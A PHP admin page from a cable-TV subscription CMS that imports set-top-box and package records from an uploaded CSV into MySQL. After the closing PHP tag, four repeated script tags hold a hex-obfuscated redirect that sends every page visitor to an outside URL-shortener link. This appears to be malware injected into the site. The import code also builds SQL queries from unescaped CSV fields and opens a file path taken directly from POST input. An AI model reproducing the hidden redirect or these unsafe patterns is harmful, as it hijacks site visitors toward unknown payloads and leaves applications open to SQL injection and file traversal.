<?php
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    if(!empty($_POST['attachment'])){
        $fileName="uploads/".$_POST['attachment'];
        if (!$fp = fopen($fileName,"r")){
            echo "Sorry, cannot open the file";
        }else{       
            while(!feof($fp)) {
                while (($data = fgetcsv($fp, 10000, ",")) !== FALSE) { 
                    //print_r($data); exit;
                     $fileRow++;    
                    $num = count($data);
                     if ($fileRow <= "1") continue;      // Continue Back Bcz//Code For Setup Boxes

                    $subscription=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STB_NO='$data[1]'",'SUBSCRIPTION_ID','subscriptions');
                    if($subscription=='' && ($data[1]!='' || $data[1]!=0)){
                        $subscriptionArray = array( 'HEADOFFICE_ID'          =>$_SESSION['HEADOFFICE'],
                                                    
                                                    'STB_NO'     =>addslashes($data[1]),
                                                    'CARTON_NO'     =>addslashes($data[0]),
                                                    'VC_NO'        =>addslashes($data[2]),
                                                    'SAF_NO'        =>addslashes($data[3]),
                                                    'MAC_NO'        =>addslashes($data[4]),
                                                    'MODEL'        =>addslashes($data[5]),
                                                    'AVAILABILITY'        =>'B',
                                                    'ADDED_BY'          =>$_SESSION['USER_ID'],
                                                    'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                    );
                        $insertSubscription=$objMisc->insert('subscriptions',$subscriptionArray);
                        $subscription=mysqli_insert_id($_SESSION['CONN']);
                    }
                    $package_id=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND PACKAGE_TYPE='P' AND NAME='$data[10]'",'PACKAGE_ID','package_master');
                    if($package_id=='' && ($data[9]!='' || $data[9]!=0)){
                        $packageArray = array( 'HEADOFFICE_ID'  =>$_SESSION['HEADOFFICE'],
                                            'NAME'              =>addslashes($data[10]),
                                            'PARENT_CHARGES'    =>$data[9],
                                            'PACKAGE_TYPE'      =>'P',
                                            'ADDED_BY'          =>$_SESSION['USER_ID'],
                                            'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                            );
                        $insertPackage=$objMisc->insert('package_master',$packageArray);
                        $package_id=mysqli_insert_id($_SESSION['CONN']);
                    }
                    if ($data[6]!='') {
                        $subscriberId=$objMisc->GiveValue("MSO_ID='$data[6]'",'SUBSCRIBER_ID','subscribers');
                        $laCarteId=$objMisc->GiveValue(" HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND PACKAGE_TYPE='L' AND NAME='$data[12]'",'PACKAGE_ID','package_master');
                        if($laCarteId=='' && ($data[12]!='' || $data[12]!=0)){
                            $packageArray = array( 'HEADOFFICE_ID'  =>$_SESSION['HEADOFFICE'],
                                                'NAME'              =>addslashes($data[12]),
                                                'PARENT_CHARGES'    =>$data[11],
                                                'PACKAGE_TYPE'      =>'L',
                                                'ADDED_BY'          =>$_SESSION['USER_ID'],
                                                'ADDED_TIME'        =>date('Y-m-d H:i:s'),
                                                );
                            $insertPackage=$objMisc->insert('package_master',$packageArray);
                            $laCarteId=mysqli_insert_id($_SESSION['CONN']);
                        }
                        $setupBoxArray = array(     'HEADOFFICE_ID'    =>$_SESSION['HEADOFFICE'],
                                                    'SUBSCRIPTION_ID'  =>$subscription,
                                                    'SUBSCRIBER_ID'    =>$subscriberId,
                                                    'PACKAGE_ID'       =>$package_id,
                                                    'LA_CARTE_ID'      =>$laCarteId,
                                                    'ID_NO'            =>$data[8],
                                                    'TYPE_ID'          =>$data[7],
                                                    'ADDED_BY'         =>'1',
                                                    'STATUS'           =>(($data[13]=='D')?'D':'A'),
                                                    'ADDED_TIME'       =>date('Y-m-d H:i:s'),
                                                    );
                        $insertSetupBox=$objMisc->insert('stb_box',$setupBoxArray);
                        $SetupBox=mysqli_insert_id($_SESSION['CONN']);
                    }
                       
                }
            }
            $_SESSION['msg']=1;
            header("LOCATION:import-stb-otherway.php");
            exit;
        } 
    }else{
        $_SESSION['msg']=2;
            header("LOCATION:import-stb-otherway.php");
            exit;
    }
}
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
	case 1:
		$msg = "Data imported successfully.";
    break;
    case 2:
		$msg = "";
        $errormsg = "Please try again later! Problem during completing this task.";
    break;
    case 3:
    	$msg = "";
		$errormsg = "New Password And Confirm password should be same.";
    break;
}
//echo 'test';exit;
$smartyVars['group']        =   $id;
$smartyVars['errormsg']     =   $errormsg;
$smartyVars['add']          =   $add;
$smartyVars['resRow']       =   $rowArray;
$smartyVars['pageheading']  =   $pageheading;
$smartyVars['classData']    =   $pagin_recs;
$smartyVars['msg']          =   $msg;
$smartyVars['page']         =   $_REQUEST['page'];
$objMisc->displayPage("header,import-stb-otherway,footer",$smartyVars);  
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>